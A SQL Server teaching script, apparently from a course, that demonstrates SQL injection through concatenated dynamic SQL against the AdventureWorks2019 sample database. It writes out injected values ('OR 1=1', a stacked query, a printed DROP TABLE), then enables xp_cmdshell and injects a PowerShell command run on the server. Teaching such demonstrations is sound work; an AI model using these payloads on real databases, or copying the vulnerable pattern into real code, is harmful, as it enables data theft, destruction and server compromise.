use [AdventureWorks2019]
GO

-- Example of non parameterized query in which we can inject unwanted code
-- This code could be the result of searching for a specific person in your database back-end
-- The userID is the parameter that is received from the client
DECLARE @sql NVARCHAR(2000)
DECLARE @userid VARCHAR(250)
SET @userid = '2'

SET @sql = N'SELECT * FROM Person.Person WHERE BusinessEntityID = ' + @userid

EXEC sp_executesql @sql
GO

-- Now lets inject some malicious code
DECLARE @sql NVARCHAR(2000)
DECLARE @userid VARCHAR(250)
SET @userid = '2 OR 1=1'

SET @sql = N'SELECT * FROM Person.Person WHERE BusinessEntityID = ' + @userid

EXEC sp_executesql @sql
GO

-- Now lets inject some more malicious code
DECLARE @sql NVARCHAR(2000)
DECLARE @userid VARCHAR(250)
SET @userid = '2; SELECT * FROM Person.Address'

SET @sql = N'SELECT * FROM Person.Person WHERE BusinessEntityID = ' + @userid

EXEC sp_executesql @sql
GO

-- Being even more evil, don't worry we won't execute
DECLARE @sql NVARCHAR(2000)
DECLARE @userid VARCHAR(250)
SET @userid = '2; DROP TABLE Person.Person'

SET @sql = N'SELECT * FROM Person.Person WHERE BusinessEntityID = ' + @userid
PRINT @sql

GO

-- We could even get access to the OS if xp_cmdshell is enabled
-- Enabled xp_cmdshell (don't ever do this)
USE master;  
GO  

EXEC sp_configure 'show advanced option', '1';  
RECONFIGURE WITH OVERRIDE;   

EXEC sp_configure 'xp_cmdshell', 1;  
GO  
RECONFIGURE;

USE [AdventureWorks2019]
GO

-- Run some powershell on the server itself
DECLARE @sql NVARCHAR(2000)
DECLARE @userid VARCHAR(250)
SET @userid = '2; exec xp_cmdshell ''powershell -command " Get-ChildItem ''''C:\Query Masterclass\Scripts\'''' | Select-Object Name"'''

SET @sql = N'SELECT * FROM Person.Person WHERE BusinessEntityID = ' + @userid
EXEC sp_executesql @sql

GO